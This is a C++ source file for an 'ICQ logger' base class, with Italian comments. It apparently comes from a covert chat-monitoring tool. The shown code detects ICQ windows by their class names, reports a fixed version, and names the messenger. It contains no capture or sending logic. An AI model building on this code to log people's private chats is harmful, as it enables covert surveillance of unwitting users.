/*
* ICQ logger, base class
*
* Coded by: Quequero
* Date: 17/Nov/2010
*
*/

#include <string>
#include <vector>
#include <exception>
using namespace std;

#include "QIcq.h"
#include "QAgent.h"
#include "..\common.h"
QIcq::QIcq(HWND hw)
{
	hwChat = hwUserList = hwLogin = hwContacts = hwHistory = NULL;
}

/**
* Torna TRUE se la finestra identificata dall'hwnd contenuto in QProperty appartiene ad Icq
*/
BOOL QIcq::Is(HWND hw)
{
	WCHAR wClassName[256];
	HWND hChld;

	// Icq
	WCHAR pwClass[] = L"__oxFrame.class__";

	if(FNC(GetClassNameW)(hw, wClassName, 256) == 0)
		return FALSE;
	if(wcsncmp(wClassName, pwClass, wcslen(wClassName)))
		return FALSE;

	if (hChld = FNC(FindWindowExW)(hw, NULL, pwClass, NULL))
		if (hChld = FNC(FindWindowExW)(hw, hChld, pwClass, NULL))
			if (hChld = FNC(FindWindowExW)(hw, hChld, pwClass, NULL))
				return TRUE;

	return FALSE;
}

UINT QIcq::Version(const HWND hw)
{
	UINT uVersion;

	uVersion = VersionEx(NULL);

	switch(uVersion){
		case 0x07:
			return ICQ_7;

		default:
			return UNKNOWN_VERSION;
	}

	return UNKNOWN_VERSION;
}

UINT QIcq::VersionEx(const HWND hw)
{
	// XXX - Per ora e' supportata solo questa versione
	return 7;
}

const PWCHAR QIcq::GetMessenger()
{ 
	return L"ICQ"; 
}